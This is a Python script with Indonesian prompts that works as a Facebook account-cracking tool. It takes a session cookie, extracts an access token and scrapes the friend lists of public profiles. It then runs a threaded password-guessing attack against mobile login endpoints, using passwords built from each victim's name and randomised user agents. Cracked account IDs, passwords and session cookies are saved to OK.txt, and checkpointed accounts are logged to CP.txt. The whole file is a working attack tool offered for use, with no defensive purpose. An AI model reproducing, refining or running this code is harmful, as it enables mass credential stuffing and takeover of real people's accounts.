# coding=utf-8
###MODULE######
import os,re,sys,time,random,requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser

C = "\033[1m" 
P = "\033[1;37m" 
H = "\033[1;32m" 
K = "\033[1;33m"
M = "\033[1;31m"

ugen = []
ok = 0
cp = 0
lo= 0

for xd in range(10000):
	aa='Opera/9.80 (Android; Opera Mini'
	b=random.choice(['8','9','10','11','12'])
	c='; en-US; SM-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(678, 9999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Presto'
	h=random.randrange(90,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/12.16'
	uaku2=f'{aa} {b} {c}{d}{e}{f}) {g} {l}'
	ugen.append(uaku2)


def login():
	os.system("clear")
	print("""%s ___  ___ ___ 
/ __|/ __| __|
\__ \ (__| _| 
|___/\___|_|  
"""%(P))									
	print("%s[!] Login Menggunakan Cookies Facebook"%(P))
	cookie = input("%s[!] Massukan Cookie : "%(C))
	try:
		session = requests.session()
		get_tok = session.get('https://business.facebook.com/business_locations',headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
		token = re.search("(EAAG\w+)", get_tok.text).group(1)
		coki = {"cookie":cookie}
		open('cokis.txt','w').write(cookie)
		open('token.txt','w').write(token)
		print("\n%s[!] Login Berhasil"%(C))
		time.sleep(3)
		menu()
	except KeyError:
		print("[!] Login Gagal")
		time.sleep(0.5)
		login()

def menu():
	os.system("clear")
	try:
		token = open("token.txt","r").read()
		cookie = {"cookie":open("cokis.txt","r").read()}
		nama = requests.get('https://graph.facebook.com/me?access_token={}'.format(token),cookies=cookie).json()["name"]
	except (IOError,KeyError,FileNotFoundError):
		os.system("clear")
		print("%s[!] Cookie Kadaluwarsa"%(P))
		time.sleep(3)
		os.system("rm -rf cokis.txt")
		login()
	except requests.exceptions.ConnectionError:
		print("%s[!] Tidak Ada Koneksi Internet"%(P))
	print("""%s ___  ___ ___ 
/ __|/ __| __|
\__ \ (__| _| 
|___/\___|_|  
"""%(P))				
	print("%s[+] Welcome : %s"%(P,nama))
	print("\n%s[1]. Crack Publik"%(P))
	print("%s[2]. Crack Masal"%(P))
	print("%s[3]. Crack File"%(P))
	print("%s[4]. Cek Hasil"%(P))
	print("%s[0]. Keluar"%(P))
	c = input("\n%s[?] "%(P))
	if c in[""]:
		print("%s[!] Pilihan tidak ada"%(P))
		time.sleep(3)
		menu()
	elif c in ["1","01"]:
		try:
			with requests.Session() as ses:
				print("\n%s[!] Perlu DI Ingat Target Harus Bersifat Publik"%(P))
				idt = input('%s[!] Masukkan Id Publik : '%(P))
				id = input('%s[!] Masukkan Nama File : '%(P))
				for x in ses.get('https://graph.facebook.com/%s?fields=name,friends.fields(id,username,name).limit(5000)&access_token=%s'%(idt,token),cookies=cookie).json()['friends']['data']:
					try:
						open(id,"a+").write("%s|%s\n"%(x["username"],x["name"]))
					except:
						open(id,"a+").write("%s|%s\n"%(x["id"],x["name"]))
		except KeyError:
			print("%s[!] Pertemanan Tidak Publik"%(P))
		except requests.exceptions.ConnectionError:
			print("%s[!] Tidak Ada Koneksi Internet"%(P))
			exit()
		else:
			print(f"[+] File Dump Tersimpan DI '{id}' ")
			facebook().crack(id)
	elif c in["2","02"]:
		try:
			target = int(input("\n%s[!] Masukkan Jumlah Target : "%(P)))
			id = input('%s[!] Masukkan Nama File : '%(P))
		except ValueError:
			print("%s[!] Intiger Error Masukkan Angka Jangan Huruf"%(P))
			target = 1
		for itil in range(target):
			idt = input('%s[!] Masukkan Id Publik : '%(P))
			try:
				with requests.Session() as ses:
					for x in ses.get('https://graph.facebook.com/%s?fields=name,friends.fields(id,username,name).limit(5000)&access_token=%s'%(idt,token),cookies=cookie).json()['friends']['data']:
						try:
							open(id,"a+").write("%s|%s\n"%(x["username"],x["name"]))
						except:
							open(id,"a+").write("%s|%s\n"%(x["id"],x["name"]))
			except KeyError:
				print("%s[!] Pertemanan Tidak Publik"%(P))
			except requests.exceptions.ConnectionError:
				print("%s[!] Tidak Ada Koneksi Internet"%(P))
				exit()
		else:
			print(f"[+] File Dump Tersimpan DI '{id}' ")
			facebook().crack(id)
	elif c in["3","03"]:
		try:
			id = input('%s\n[!] Masukkan File Dump : '%(P))
		except FileNotFoundError:
			print("%s[!] File Dump Tidak Tersedia Directory"%(P))
			exit()
		except requests.exceptions.ConnectionError:
			print("%s[!] Tidak Ada Koneksi Internet"%(P))
		else:
			print(f"[+] File Dump Anda '{id}' ")
			facebook().crack(id)
	elif c in["4","04"]:
		print("\n[1]. Cek Acccount OK")
		print("[2]. Cek Acccount CP")
		h= input("\n[!] ")
		if h in[""]:
			print("%s[!] Pilihan Tidak Ada"%(P))
			menu()
		elif h in["1","01"]:
			try:
				ok = open("OK.txt").read().splitlines()
			except FileNotFoundError:
				exit("%s[!] Tidak Ada Results OK"%(P))
			print()
			print("[!] Total Acccount OK : %s"%(len(ok)))
			print("%s"%(H))
			os.system("cat OK.txt")
			input("%s\n[+] Enter "%(P))
			menu()
		elif h in["2","02"]:
			try:
				cp = open("CP.txt").read().splitlines()
			except FileNotFoundError:
				exit("%s[!] Tidak Ada Results CP"%(P))
			print()
			print("[!] Total Acccount CP : %s"%(len(cp)))
			print("%s"%(K))
			os.system("cat CP.txt")
			input("%s\n[+] Enter "%(P))
			menu()
		else:
			print("%s[!] Pilihan Tidak Ada"%(P))
			menu()
	elif c in["0","00"]:
		os.remove('cokis.txt')
		print('\n%s[*] Berhasil Hapus Cookies'%(P))
	else:
		print("%s[!] Pilihan Tidak Ada"%(P))
		menu()
		
class facebook:
	def __init__(self):
		self.id = []
		
	def crack(self,id):
		self.id = id
		self.id = open(id,'r').read().splitlines()
		print("\n%s[+] Jumlah ID Yang Terkumpul : %s"%(C,len(self.id)))
		print("%s[+] Results Acccount OK Tersimpan Di : OK.txt"%(P))
		print("%s[+] Results Acccount CP Tersimpan Di : CP.txt"%(P))
		print("\n[*] Harap Mainkan Mode Pesawat di Id 500");print()
		with ThreadPoolExecutor(max_workers=35) as sub:
			for user in self.id:
				try:
					uid,name = user.split("|")
					nama = name.split(" ")
					pwx = [name.replace(" ",""), name.replace(" "," "),nama[0]+'123', nama[0]+'1234', nama[0]+'12345']
					sub.submit(self.gas,uid,pwx,"free.facebook.com")
				except Exception:pass
		print("%s\n\n[+] Proses Crack Selesai"%(P))
		os.remove(id)

	def gas(self,ids,pwx,cebok):
		global lo,ok,cp
		sys.stdout.write("\r%s[CRACK] %s/%s OK:-%s CP:-%s "%(P,lo,len(self.id),(ok),(cp)));sys.stdout.flush()
		try:
			for pw in pwx:
				pw = pw.lower()
				ses= requests.session()
				ua = random.choice(ugen)
				p = ses.get(f'https://{cebok}/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&_rdr').text
				dataa ={
				"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
				"uid":ids,
				"next":"https://free.facebook.com/login/save-device/",
				"flow":"login_no_pin",
				"pass":pw}
				ses.headers.update({
				"Host":cebok,
				"cache-control":"max-age=0",
				"upgrade-insecure-requests":"1",
				"origin":"https://"+cebok,
				"content-type":"application/x-www-form-urlencoded",
				"user-agent":ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with":"mark.via.gp",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"navigate",
				"sec-fetch-user":"?1",
				"sec-fetch-dest":"document",
				"referer":"https://free.facebook.com/login/device-based/password/?uid="+ids+"&flow=login_no_pin&refsrc=deprecated&_rdr",
				"accept-encoding":"gzip, deflate",
				"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				po = ses.post(f'https://{cebok}/login/device-based/validate-password/?locale=id_ID',data=dataa,allow_redirects=False)
				if "c_user" in ses.cookies.get_dict():
					cox = ses.cookies.get_dict()
					cokis = 'datr=' + cox['datr'] + ';' + ('c_user=' + cox['c_user']) + ';' + ('fr=' + cox['fr']) + ';' + ('xs=' + cox['xs'])
					print("\r%s[OK] %s|%s|%s																					"%(P,ids,pw,cokis))
					open("OK.txt","a").write("[OK] %s|%s\n"%(ids,pw))
					ok+=1
					break
				elif "checkpoint" in ses.cookies.get_dict():
					print("\r%s[CP] %s|%s																					"%(P,ids,pw))
					open("CP.txt","a").write("[CP] %s|%s\n"%(ids,pw))
					cp+=1
					break
				else:continue
			lo+=1
		except:
			time.sleep(30)
			self.gas(self,ids,pwx,cebok)
			
if __name__=='__main__':
	menu()
